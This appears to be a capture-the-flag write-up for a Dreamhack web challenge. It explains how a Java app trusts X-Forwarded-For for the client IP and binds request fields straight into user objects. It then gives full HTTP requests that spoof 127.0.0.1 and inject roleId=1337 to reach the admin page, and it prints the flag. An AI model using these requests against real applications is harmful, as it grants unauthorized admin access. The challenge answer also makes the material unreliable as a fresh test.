the website contains two vulnerability:

1. The applicaition determine client'IP address directly from http request .
`com.dreamhack.chall.Utils.HttpUtil;`:
```java
public class HttpUtil {
    private static final String[] IP_HEADERS = new String[]{"X-Forwarded-For", "Proxy-Client-IP", "WL-Proxy-Client-IP", "HTTP_X_FORWARDED_FOR", "HTTP_X_FORWARDED", "HTTP_X_CLUSTER_CLIENT_IP", "HTTP_CLIENT_IP", "HTTP_FORWARDED_FOR", "HTTP_FORWARDED", "HTTP_VIA", "REMOTE_ADDR"};

    private HttpUtil() {
    }

    public static String getRequestIP(HttpServletRequest request) {
        for(String header : IP_HEADERS) {
            String value = request.getHeader(header);
            if (value != null && !value.isEmpty()) {
                String[] parts = value.split("\\s*,\\s*");
                return parts[0];
            }
        }

        return request.getRemoteAddr();
    }
}
```

2. The application automatically binds data from http request into objects and stores them in a file.
```java
 public String RegistrationHandler(UserModel user, RedirectAttributes redir)
```

- to retrives the flag, we need to access to the admin page, which require `roleId=1337` and `ip_client=127.0.0.1` 

Flow to retrives the flag:
- 1. register a user
```
POST /signup_action.do HTTP/1.1
Host: host3.dreamhack.games:22048
Content-Length: 82
X-Forwarded-For: 127.0.0.1
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://host3.dreamhack.games:22048
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host3.dreamhack.games:22048/signup.do
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=91DFE3FB59A794113032EAE47C3965A2
Connection: keep-alive

username=abcdefg1&password=12345678&email=test2%40gmail.com&intro=hehe&roleId=1337
```

- 2. login
```
POST /signin_action.do HTTP/1.1
Host: host3.dreamhack.games:22048
Content-Length: 35
X-Forwarded-For: 127.0.0.1
Cache-Control: max-age=0
Accept-Language: en-US,en;q=0.9
Origin: http://host3.dreamhack.games:22048
Content-Type: application/x-www-form-urlencoded
Upgrade-Insecure-Requests: 1
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/133.0.0.0 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
Referer: http://host3.dreamhack.games:22048/signin.do
Accept-Encoding: gzip, deflate, br
Cookie: JSESSIONID=91DFE3FB59A794113032EAE47C3965A2
Connection: keep-alive

username=abcdefg1&password=12345678
```

- 3. acccess admin page to obtain flag: `DH{927bb2ae73ef0881e62e732dfdc1a321}`
